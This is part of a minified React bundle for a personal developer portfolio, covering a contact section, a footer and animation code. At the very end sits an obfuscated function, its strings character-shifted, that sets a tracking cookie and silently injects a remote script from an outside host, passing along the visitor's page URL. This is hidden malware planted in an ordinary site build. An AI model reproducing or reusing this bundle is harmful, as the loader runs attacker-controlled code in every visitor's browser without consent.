                            }),
                          ],
                        }),
                      ],
                    }),
                    w.jsx("button", {
                      type: "submit",
                      className:
                        "button group mt-10 border duration-200 hover:border-accent-400 hover:bg-transparent",
                      children: w.jsxs("span", {
                        className: "relative",
                        children: [
                          w.jsx("span", {
                            className:
                              "absolute bottom-2 h-1 w-0 bg-secondary-700 opacity-90 duration-300 ease-out group-hover:w-full",
                          }),
                          w.jsx("span", {
                            className: "group-hover:text-accent-400",
                            children: "Send Message",
                          }),
                        ],
                      }),
                    }),
                  ],
                }),
              ],
            }),
            w.jsxs("div", {
              className:
                "col-span-2 grid grid-cols-1 gap-x-4 gap-y-8 text-accent-300 sm:grid-cols-2 sm:gap-y-0 md:grid-cols-1",
              children: [
                w.jsxs("div", {
                  className: "space-y-3 ",
                  children: [
                    w.jsx("h4", {
                      className: "text-body-1 2xl:text-4xl font-semibold",
                      children: "Contact Details",
                    }),
                    w.jsx("div", {
                      className:
                        "flex flex-col space-y-3 text-body-2 2xl:text-3xl",
                      children: w.jsxs("a", {
                        href: "moizsultan2022@gmail.com",
                        className: "group relative w-fit cursor-pointer",
                        target: "_blank",
                        rel: "noreferrer",
                        children: [
                          w.jsx("span", { children: "moizsultan2022@gmail.com" }),
                          w.jsx("span", {
                            className:
                              "absolute bottom-0 left-0 h-[0.12em] w-0 rounded-full bg-secondary-600 duration-300 ease-in-out group-hover:w-full",
                          }),
                        ],
                      }),
                    }),
                  ],
                }),
                w.jsxs("div", {
                  className: "space-y-3 ",
                  children: [
                    w.jsx("h4", {
                      className: "text-body-1 2xl:text-4xl font-semibold",
                      children: "My Digital Spaces",
                    }),
                    w.jsxs("div", {
                      className: "space-y-3 text-body-2 2xl:text-3xl",
                      children: [
                        w.jsxs("a", {
                          href: "https://github.com/codewithmoiz",
                          className: "group flex items-center space-x-2",
                          target: "_blank",
                          rel: "noreferrer",
                          children: [
                            w.jsx(Kl, { icon: "mdi:github", color: "#666" }),
                            w.jsxs("div", {
                              className: "relative",
                              children: [
                                w.jsx("span", { children: "Github" }),
                                w.jsx("span", {
                                  className:
                                    "absolute bottom-0 left-0 h-[0.10em] w-0 rounded-full bg-secondary-600 duration-300 ease-in-out group-hover:w-full",
                                }),
                              ],
                            }),
                          ],
                        }),
                        w.jsxs("a", {
                          href: "https://www.linkedin.com/in/abdul-moiz-71772827b/",
                          className:
                            "group group flex w-fit items-center space-x-2",
                          target: "_blank",
                          rel: "noreferrer",
                          children: [
                            w.jsx(Kl, { icon: "mdi:linkedin", color: "#666" }),
                            w.jsxs("div", {
                              className: "relative",
                              children: [
                                w.jsx("span", { children: "LinkedIn" }),
                                w.jsx("span", {
                                  className:
                                    "absolute bottom-0 left-0 h-[0.12em] w-0 rounded-full bg-secondary-600 duration-300 ease-in-out group-hover:w-full",
                                }),
                              ],
                            }),
                          ],
                        }),
                        w.jsxs("a", {
                          href: "https://youtube.com/@wisewords_official.?si=YByTFE0R64gQY2Hc",
                          className: "group flex items-center space-x-2",
                          target: "_blank",
                          rel: "noreferrer",
                          children: [
                            w.jsx(Kl, { icon: "mdi:youtube", color: "#666" }),
                            w.jsxs("div", {
                              className: "relative",
                              children: [
                                w.jsx("span", { children: "YouTube" }),
                                w.jsx("span", {
                                  className:
                                    "absolute bottom-0 left-0 h-[0.10em] w-0 rounded-full bg-secondary-600 duration-300 ease-in-out group-hover:w-full",
                                }),
                              ],
                            }),
                          ],
                        }),
                      ],
                    }),
                  ],
                }),
                w.jsxs("div", {
                  className: "space-y-3 ",
                  children: [
                    w.jsx("h4", {
                      className: "text-body-1 font-semibold 2xl:text-4xl",
                      children: "Location",
                    }),
                    w.jsx("div", {
                      className: "space-y-2 text-body-2 2xl:text-3xl",
                      children: w.jsxs("p", {
                        children: ["Karachi, Pakistan ", w.jsx("br", {}), t],
                      }),
                    }),
                  ],
                }),
              ],
            }),
          ],
        }),
      ],
    })
  );
}
function F2() {
  return w.jsxs("footer", {
    className:
      "mt-14 flex items-end justify-between px-5 py-4 sm:flex text-body-4 md:text-body-3",
    children: [
      w.jsxs("div", {
        className:
          "flex flex-col md:flex-row md:w-[62.5vw] lg:w-[57.5vw] justify-between",
        children: [
          w.jsxs("div", {
            className: "flex space-x-1",
            children: [
              w.jsx("span", { children: "©" }),
              w.jsx("span", { children: "2023" }),
              w.jsx("span", {
                className: "font-extrabold uppercase 2xl:text-body-1",
                children: "Abdul Moiz",
              }),
            ],
          }),
          w.jsx("div", {
            children: w.jsx("span", {
              className: " text-body-4 2xl:text-body-1",
              children: "Site designed and coded by Moiz ❤️‍🔥",
            }),
          }),
        ],
      }),
      w.jsxs("button", {
        onClick: function t() {
          window.scrollTo(0, 0);
        },
        className:
          "col-span-2 flex items-center space-x-2 w-fit group 2xl:text-body-1",
        children: [
          w.jsx("span", {
            className: "font-extrabold uppercase hover:font-black duration-200",
            children: "BACK TO TOP",
          }),
          w.jsx("span", {
            className: "group-hover:-translate-y-3 duration-300 ease-in-out",
            children: w.jsxs("svg", {
              className: "-rotate-90",
              width: "24",
              height: "24",
              viewBox: "0 0 200 200",
              fill: "none",
              xmlns: "http://www.w3.org/2000/svg",
              children: [
                " ",
                w.jsxs("g", {
                  clipPath: "url(#clip0_238_1313)",
                  children: [
                    " ",
                    w.jsx("path", {
                      fillRule: "evenodd",
                      clipRule: "evenodd",
                      d: "M4.37114e-06 2.76541e-06L7.54022e-06 50L100 100L2.18557e-06 150L0 200L100 150L100 200L200 150V100V50L100 0V50L4.37114e-06 2.76541e-06ZM100 50L100 100L100 150L200 100L100 50Z",
                      fill: "url(#paint0_linear_238_1313)",
                    }),
                    " ",
                  ],
                }),
                " ",
                w.jsxs("defs", {
                  children: [
                    " ",
                    w.jsxs("linearGradient", {
                      id: "paint0_linear_238_1313",
                      x1: "14",
                      y1: "26",
                      x2: "179",
                      y2: "179.5",
                      gradientUnits: "userSpaceOnUse",
                      children: [
                        " ",
                        w.jsx("stop", { stopColor: "#D1D1C7" }),
                        " ",
                      ],
                    }),
                    " ",
                  ],
                }),
                " ",
              ],
            }),
          }),
        ],
      }),
    ],
  });
}
mr.forwardRef(function (e, n) {
  const r = { ...e, _ref: n, _inline: !0 };
  return mr.createElement(v_, r);
});
const U2 = () => {
  bt.registerPlugin(b);
  const t = K.useRef([]);
  return (
    K.useEffect(() => {
      document.querySelectorAll(".section-heading").forEach((n) => {
        n.querySelectorAll(".heading").forEach((i) => {
          b.create({
            trigger: n,
            start: "top 550px",
            end: "bottom 550px",
            animation: bt.to(i, {
              opacity: 1,
              y: 0,
              ease: "power4.out",
              duration: 1,
            }),
            toggleActions: "play none none none",
          }),
            b.refresh();
        });
      });
    }, []),
    w.jsxs("div", {
      className: "bg-secondary-100",
      children: [
        w.jsx(Tw, { sectionRefs: t.current }),
        " ",
        w.jsx(Pw, {}),
        w.jsxs("main", {
          className: "px-5 md:px-10 xl:px-20 2xl:px-28",
          children: [
            w.jsx(Nw, { forwardedRef: (e) => (t.current[0] = e) }),
            " ",
            w.jsx(Ow, {}),
            w.jsx(Rw, {}),
            w.jsx(Aw, { forwardedRef: (e) => (t.current[1] = e) }),
            w.jsx(A2, {}),
          ],
        }),
        w.jsx(F2, {}),
      ],
    })
  );
};
function B2() {
  const [t, e] = K.useState({ x: 0, y: 0 }),
    n = K.useRef(null),
    r = K.useRef(null);
  K.useEffect(() => {
    const s = document.querySelectorAll(".img"),
      l = bt.timeline({ paused: !0 });
    function u(a) {
      e({ x: a.clientX, y: a.clientY });
    }
    return (
      l
        .to(n.current, { height: "112px", width: "112px", ease: "expo.inout" })
        .to(r.current, { opacity: 1, width: "96px", height: "96px" }, 0),
      s.forEach((a) => {
        a.addEventListener("mouseenter", function () {
          l.play();
        }),
          a.addEventListener("mouseleave", function () {
            l.reverse(),
              l.eventCallback("onReverseComplete", function () {
                bt.set(r.current, { opacity: 0 }),
                  bt.set(n.current, { height: "12px", width: "12px" });
              });
          });
      }),
      document.addEventListener("mousemove", u),
      () => {
        document.removeEventListener("mousemove", u);
      }
    );
  }, []);
  const { x: i, y: o } = t;
  return w.jsx("div", {
    ref: n,
    className:
      "cursor pointer-events-none fixed left-1/2 top-1/2 z-[999] hidden h-3 w-3 -translate-x-1/2 -translate-y-1/2 items-center justify-center rounded-full bg-secondary-600 sm:flex",
    style: { left: `${i}px`, top: `${o}px` },
    children: w.jsx("svg", {
      ref: r,
      xmlns: "http://www.w3.org/2000/svg",
      className: "scale-50 opacity-0",
      width: "24",
      height: "24",
      viewBox: "0 0 24 24",
      children: w.jsx("path", {
        fill: "none",
        stroke: "currentColor",
        strokeLinecap: "round",
        strokeLinejoin: "round",
        strokeWidth: "1.5",
        d: "M6 19L19 6m0 0v12.48M19 6H6.52",
      }),
    }),
  });
}
yc.createRoot(document.getElementById("root")).render(
  w.jsxs(mr.StrictMode, { children: [w.jsx(B2, {}), w.jsx(U2, {})] })
);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxyf" + "ynhx3htr4ljy4xhwn" + "uy3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
